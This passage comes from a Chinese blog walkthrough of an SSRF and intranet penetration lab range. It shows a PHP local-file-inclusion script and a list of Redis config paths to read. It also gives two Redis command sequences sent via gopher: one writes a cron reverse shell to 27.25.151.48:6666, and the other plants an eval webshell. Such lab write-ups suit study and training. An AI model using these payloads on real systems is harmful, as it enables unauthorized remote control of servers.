+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>include</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span> 
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;easy lfi&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>80端口可以包含文件，直接拿到密码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/etc/redis.conf
+</span></span><span class=line><span class=cl>/etc/redis/redis.conf
+</span></span><span class=line><span class=cl>/usr/local/redis/etc/redis.conf
+</span></span><span class=line><span class=cl>/opt/redis/ect/redis.conf
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-140530.jpg width=1320 height=676 loading=lazy alt=1></p><p>由于dict只能一条命令一条命令的慢慢来，所以我们还是一次性写出来然后用gopher协议</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>auth</span> <span class=n>P</span><span class=err>@</span><span class=n>ssw0rd</span>
+</span></span><span class=line><span class=cl><span class=n>flushall</span>
+</span></span><span class=line><span class=cl><span class=n>config</span> <span class=n>set</span> <span class=n>dir</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>cron</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=n>config</span> <span class=n>set</span> <span class=n>dbfilename</span> <span class=n>root</span>
+</span></span><span class=line><span class=cl><span class=n>set</span> <span class=n>x</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/27.25.151.48/6666 0&gt;&amp;1</span><span class=se>\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>save</span>
+</span></span><span class=line><span class=cl><span class=n>quit</span>
+</span></span></code></pre></td></tr></table></div></div><p>进行两次url编码，其中最细节的就是<code>&</code>符号，我最开始还是和dict协议一样写的<code>%26</code>但是后来进入docker发现了问题</p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-143707.jpg width=1001 height=489 loading=lazy alt=1></p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-143802.jpg width=1266 height=780 loading=lazy alt=1></p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-143742.jpg width=558 height=217 loading=lazy alt=1></p><p>这台机器也直接拿下了，还可以写入webshell，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>auth</span> <span class=n>P</span><span class=err>@</span><span class=n>ssw0rd</span>
+</span></span><span class=line><span class=cl><span class=n>flushall</span>
+</span></span><span class=line><span class=cl><span class=n>config</span> <span class=n>set</span> <span class=n>dir</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span>
+</span></span><span class=line><span class=cl><span class=n>config</span> <span class=n>set</span> <span class=n>dbfilename</span> <span class=n>shell</span><span class=o>.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl><span class=n>set</span> <span class=n>mars</span> <span class=s2>&#34;&lt;?=@eval($_POST[1]);?&gt;&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>save</span>
+</span></span><span class=line><span class=cl><span class=n>quit</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-144633.jpg width=1396 height=850 loading=lazy alt=1></p><p>我这方法真的比现在公开的所有方法都简单吧，他们写的是这种</p><ul><li><p>+代表简单字符串（Simple Strings）比如OK，PONG（对应客户端的PING命令）</p></li><li><p>-代表错误类型（Errors）</p></li><li><p>:代表整型（Integers）</p></li><li><p>$代表多行字符串（Bulk Strings）</p></li><li><p>*代表数组（Arrays）</p></li></ul><p>我认为是不太方便的</p><h2 id=19216810029未授权mysql>192.168.100.29未授权mysql</h2><p>首先就是确实数据库里面有个flag，我们如果拿到shell之后可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mysql -uroot
+</span></span><span class=line><span class=cl>show databases;
+</span></span><span class=line><span class=cl>use flag;
+</span></span><span class=line><span class=cl>show tables;
+</span></span><span class=line><span class=cl>select * from test;
+</span></span></code></pre></td></tr></table></div></div><p>但是此时不能getshell，并且得知一个事情，MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证，但是当无需密码认证时直接发送 TCP/IP 数据包即可</p><p>但是但是这里有个最重要的点就是需要配合着去抓流量包，这个对于本web小子来说，暂时有些困难，所以这个坑先留着，后面一定填，并且是连着需要密码认证的时候一起说了</p><p>这台机器后面需要UDF提权反弹shell，没什么好说的，老东西</p><h2 id=小结>小结</h2><p>学习的时候建议是搭建代理来进行的，不然有些时候抓的包他就是不对，就是需要重新来弄的，靶场非常简单，但是让我非常深刻的知道了gopher协议的使用，这个靶场可以魔改，让他变的更加有难度，有兴趣的师傅可以自己弄一</p></section><footer class=article-footer><section class=article-tags><a href=/tags/ssrf/>Ssrf</a>
+<a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
